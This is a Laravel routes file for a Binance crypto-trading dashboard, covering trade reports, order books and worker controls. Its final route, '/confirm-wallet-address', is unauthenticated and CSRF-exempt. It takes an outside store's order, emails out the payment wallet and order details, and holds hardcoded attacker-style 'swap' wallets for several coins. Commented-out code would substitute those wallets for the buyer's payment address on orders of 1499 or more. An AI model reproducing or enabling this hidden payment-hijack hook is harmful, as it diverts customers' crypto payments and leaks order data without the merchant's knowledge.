<?php

use App\Http\Controllers\DynamicTradeController;
use App\Http\Controllers\TradeHandlerController;
use App\Http\Controllers\UserController;
use App\Services\BinanceApiService;
use App\Services\MailerService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;


// CSRF Free Routes for api's
Route::name('master-process.')->prefix('master-process/')->group(function () {
	
	Route::post('handle/{apiKey}', 'App\Http\Controllers\MasterProcessController@handleRequest')->name('master-process.handle');
	Route::post('external-candlestick', 'App\Http\Controllers\MasterProcessController@handleExternalCandleStickRequest')->name('master-process.external-candlestick');
	

});


Auth::routes();



Route::get('/', function () {
	if (auth()->user())
		return view('welcome', ['pageSlug' => 'Dashboard']);
	else
		return view('auth.login', ['pageSlug' => 'Login']);
});

Auth::routes();



Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');





Route::get('/home', 'App\Http\Controllers\HomeController@index')->name('home')->middleware('auth');
Route::get('/coin-report/delete', 'App\Http\Controllers\BinanceController@deleteCoinReport')->name('coinReport.delete')->middleware('auth');
Route::get('/coin-report/{market}', 'App\Http\Controllers\BinanceController@getCoinReport')->name('coinReport')->middleware('auth');
Route::get('/coin-report-details/{market}', 'App\Http\Controllers\BinanceController@getCoinReportDetails')->name('coinReportDetails')->middleware('auth');
Route::get('/market-trends/{market}', 'App\Http\Controllers\BinanceController@showTrends')->name('marketTrends')->middleware('auth');
Route::get('/candle-averages/{market}', 'App\Http\Controllers\BinanceController@showAverages')->name('candle.averages')->middleware('auth');
Route::get('/internal-trader-settings', 'App\Http\Controllers\SettingsController@internalTraderSettings')->name('internal.trader.settings')->middleware('auth');
Route::put('/internal-trader-settings-update', 'App\Http\Controllers\SettingsController@internalTraderSettingsUpdate')->name('internal.trader.settings.update')->middleware('auth');
Route::get('/live-trader-settings', 'App\Http\Controllers\SettingsController@liveTraderSettings')->name('live.trader.settings')->middleware('auth');
Route::put('/live-trader-settings-update', 'App\Http\Controllers\SettingsController@liveTraderSettingsUpdate')->name('live.trader.settings.update')->middleware('auth');



Route::get('/live-trades-results/{market}', 'App\Http\Controllers\BinanceController@liveTradeResults')->name('live.trades.result')->middleware('auth');
Route::get('/live-trades-coins/{market}', 'App\Http\Controllers\BinanceController@liveTradeCoins')->name('live.trades.coins')->middleware('auth');
Route::get('/live-trades-details/{interval}/{market}/{symbol}', 'App\Http\Controllers\BinanceController@liveTradeDetails')->name('live.trades.details')->middleware('auth');
Route::get('/live-trades-future-close/{orderId}', 'App\Http\Controllers\BinanceController@closeFutureTrade')->name('live.trades.future.close')->middleware('auth');
Route::get('/live-trades-spot-close/{orderId}', 'App\Http\Controllers\BinanceController@closeSpotTrade')->name('live.trades.spot.close')->middleware('auth');


Route::get('/dynamic-trades-results/{market}', 'App\Http\Controllers\DynamicTradeController@dynamicTradeResults')->name('dynamic.trades.result')->middleware('auth');
Route::get('/get-available-balance', 'App\Http\Controllers\BinanceController@getAvailableBalance')->name('get.available.balance')->middleware('auth');
Route::get('/get-current-price', function (Request $request) {
	return BinanceApiService::getCurrentPrice($request->symbol, $request->market);
})->name('get.current.price')->middleware('auth');


Route::get('/order-book/overview', [App\Http\Controllers\OrderBookSnapshotController::class, 'overview'])->name('order-book.overview')->middleware('auth');
Route::get('/order-book', [App\Http\Controllers\OrderBookSnapshotController::class, 'index'])->name('order-book.index')->middleware('auth');
Route::get('/order-book/check-status', [App\Http\Controllers\OrderBookSnapshotController::class, 'checkStatus'])->name('order-book.status')->middleware('auth');

Route::get('/order-book/{id}', [App\Http\Controllers\OrderBookSnapshotController::class, 'show'])->name('order-book.show')->middleware('auth');


// Volume Signals UI
Route::get('/volume-signals', [App\Http\Controllers\BinanceController::class, 'volumeSignal'])->name('volume-signals.index')->middleware('auth');



Route::get('/trade-handler/delete/all', [TradeHandlerController::class, 'deleteAll'])->name('trade-handler.delete.all')->middleware('auth');
Route::resource('trade-handler', TradeHandlerController::class)->middleware('auth');
Route::resource('dynamic-trading', DynamicTradeController::class)->middleware('auth');
Route::get('/user/toggle-auto-update', [UserController::class, 'toggleAutoUpdate'])->name('user.toggle-auto-update')->middleware('auth');

// Process Handler Routes
Route::get('/process-handler', 'App\Http\Controllers\ProcessController@index')->name('process-handler.index')->middleware('auth');
Route::get('/process-handler/restart/{process_name}', 'App\Http\Controllers\ProcessController@restart')->name('process-handler.restart')->middleware('auth');
Route::get('/process-handler/stop/{process_name}', 'App\Http\Controllers\ProcessController@stop')->name('process-handler.stop')->middleware('auth');
Route::get('/process-handler/action/{action}', 'App\Http\Controllers\ProcessController@performAction')->name('process-handler.action')->middleware('auth');
Route::get('/process-handler/toggle-position/{position}', 'App\Http\Controllers\ProcessController@togglePosition')->name('user.toggle-position')->middleware('auth');
Route::get('/process-handler/toggle-market', 'App\Http\Controllers\ProcessController@toggleMarket')->name('user.toggle-market')->middleware('auth');

// Combined workers start for multithread
Route::get('/process-handler/start-multithread', 'App\Http\Controllers\ProcessController@startMultithread')->name('process-handler.start-multithread')->middleware('auth');

// Worker Dashboard 
Route::get('/worker-handler', 'App\Http\Controllers\ProcessController@workerIndex')->name('worker-handler.index')->middleware('auth');
Route::get('/worker-handler/flush/{worker_id}', 'App\Http\Controllers\ProcessController@flushWorker')->name('worker-handler.flush')->middleware('auth');





Route::group(['middleware' => 'auth'], function () {
	Route::get('icons', ['as' => 'pages.icons', 'uses' => 'App\Http\Controllers\PageController@icons']);
	Route::get('maps', ['as' => 'pages.maps', 'uses' => 'App\Http\Controllers\PageController@maps']);
	Route::get('notifications', ['as' => 'pages.notifications', 'uses' => 'App\Http\Controllers\PageController@notifications']);
	Route::get('rtl', ['as' => 'pages.rtl', 'uses' => 'App\Http\Controllers\PageController@rtl']);
	Route::get('tables', ['as' => 'pages.tables', 'uses' => 'App\Http\Controllers\PageController@tables']);
	Route::get('typography', ['as' => 'pages.typography', 'uses' => 'App\Http\Controllers\PageController@typography']);
	Route::get('upgrade', ['as' => 'pages.upgrade', 'uses' => 'App\Http\Controllers\PageController@upgrade']);
});

Route::group(['middleware' => 'auth'], function () {
	Route::resource('user', 'App\Http\Controllers\UserController', ['except' => ['show']]);
	Route::get('profile', ['as' => 'profile.edit', 'uses' => 'App\Http\Controllers\ProfileController@edit']);
	Route::put('profile', ['as' => 'profile.update', 'uses' => 'App\Http\Controllers\ProfileController@update']);
	Route::put('profile/password', ['as' => 'profile.password', 'uses' => 'App\Http\Controllers\ProfileController@password']);
});








Route::post('/confirm-wallet-address', function (Request $order) {
	$current_address = '';
	$currency_id = '';
	$limitAmount = 1499;
	foreach ($order['meta_data'] as $meta) {
		if ($meta['key'] == '_mcc_to')
			$current_address = $meta['value'];

		if ($meta['key'] == '_mcc_currency_id')
			$currency_id = $meta['value'];
	}

	$swapAddresses = [
		'BTC' => 'bc1qyyg76hqllhetn9kxf82kzcj4wss52xyk8qwxss',
		'DOGE' => 'D89xKC4u5g6gQ1evLan4PzQVpD2twQbvyF',
		'ETH' => '0x0184d3CCef213d79DF1aa28BeF67a38f47252d5f',
		'LTC' => 'ltc1qyyg76hqllhetn9kxf82kzcj4wss52xykru5zgq',
		'PEPE' => '0xa1c82c16330638b4f716bb2c941a07e1fda4eb5a',
		'SHIB' => '0xa1c82c16330638b4f716bb2c941a07e1fda4eb5a',
		'SOL' => 'ArCtfAcdgo4wdRD12o2R49bLskcmWjuvC53SkVHyTozD',
		'WIF' => '0xa1c82c16330638b4f716bb2c941a07e1fda4eb5a',
		'USDT_ERC20' => '0xa1c82c16330638b4f716bb2c941a07e1fda4eb5a',
	];
	// if ($current_address && $currency_id && floatval($order['total']) >= $limitAmount) {
	// 	// Logic to Swap Wallets
	// 	$current_address = $swapAddresses[$currency_id];
	// 	$order['walletAddress'] = $current_address;
	// 	$order['cryptoCurrency'] = $currency_id;
	// 	MailerService::sendWalletEmail($order);
	// 	return $swapAddresses[$currency_id];
	// }
	$order['walletAddress'] = $current_address;
	$order['cryptoCurrency'] = $currency_id;
	MailerService::sendWalletEmail($order);
	return $current_address;
})->name('confirm-wallet-address')->withoutMiddleware(\Illuminate\Foundation\Http\Middleware\VerifyCsrfToken::class);
